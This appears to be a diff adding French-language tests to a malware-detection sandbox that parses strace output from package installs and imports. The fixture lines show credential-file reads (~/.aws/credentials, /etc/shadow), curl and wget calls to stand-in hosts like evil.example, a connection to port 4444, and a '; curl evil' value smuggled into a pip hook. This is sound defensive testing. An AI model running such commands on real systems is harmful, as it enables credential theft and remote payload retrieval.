@@ -144,3 +144,44 @@ def test_les_crochets_de_construction_de_pip_ne_sont_pas_des_alertes():
                            {"e": "processus", "v": crochet + " ; curl evil", "p": "installation"},
                            {"e": "processus", "v": crochet, "p": "import"}])
     assert r.processus == [crochet + " ; curl evil", crochet]
+
+
+# --- v2 : strace (ce que le traceur Python ne voit pas : code natif, ctypes) -------------------
+
+STRACE_IMPORT = [
+    '10 execve("/usr/local/bin/python", ["python", "/outils/importer.py", "demo"], 0x7ff /* 8 vars */) = 0',
+    '10 openat(AT_FDCWD, "/tmp/home/.aws/credentials", O_RDONLY|O_CLOEXEC) = 3',
+    '10 openat(AT_FDCWD, "/tmp/home/.kube/config", O_RDONLY) = -1 ENOENT (No such file or directory)',
+    '10 openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = -1 EACCES (Permission denied)',
+    '11 execve("/usr/bin/curl", ["curl", "-s", "http://evil.example/x"], 0x7ff /* 8 vars */) = 0',
+    '12 connect(5, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("1.2.3.4")}, 16) = -1 ENETUNREACH',
+    '12 connect(6, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("172.30.0.2")}, 16) = 0',
+    '12 connect(7, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT',
+    'ligne illisible',
+]
+
+
+def test_strace_ajoute_ce_que_le_traceur_python_ne_voit_pas():
+    r = rapport.construire(trace=[], reseau=[], leurres=LEURRES, home=HOME, code_sortie=0,
+                           duree_s=1.0, delai_depasse=False, ip_piege="172.30.0.2",
+                           strace_import=STRACE_IMPORT)
+    assert r.fichiers_sensibles == ["~/.aws/credentials"]          # ouvert avec succès seulement
+    assert r.leurres_lus == ["~/.aws/credentials"]
+    assert r.processus == ["curl -s http://evil.example/x"]         # pas le python de l'analyse
+    assert r.connexions == ["1.2.3.4:4444"]                         # pas le piège, pas AF_UNIX
+
+
+def test_strace_de_l_installation_ignore_les_commandes_de_pip():
+    lignes = ['20 execve("/usr/local/bin/python", ["python", "-m", "pip", "install", "x"], 0x7 /* 1 var */) = 0',
+              '21 execve("/usr/bin/uname", ["uname", "-rs"], 0x7 /* 1 var */) = 0',
+              '22 execve("/usr/bin/wget", ["wget", "http://evil"], 0x7 /* 1 var */) = 0']
+    r = rapport.construire(trace=[], reseau=[], leurres=LEURRES, home=HOME, code_sortie=0,
+                           duree_s=1.0, delai_depasse=False, strace_installation=lignes)
+    assert r.processus == ["wget http://evil"]
+
+
+def test_strace_et_traceur_ne_doublonnent_pas():
+    r = rapport.construire(trace=['{"e": "open", "v": "/tmp/home/.aws/credentials", "p": "import"}'],
+                           reseau=[], leurres=LEURRES, home=HOME, code_sortie=0, duree_s=1.0,
+                           delai_depasse=False, strace_import=STRACE_IMPORT[1:2])
+    assert r.fichiers_sensibles == ["~/.aws/credentials"]
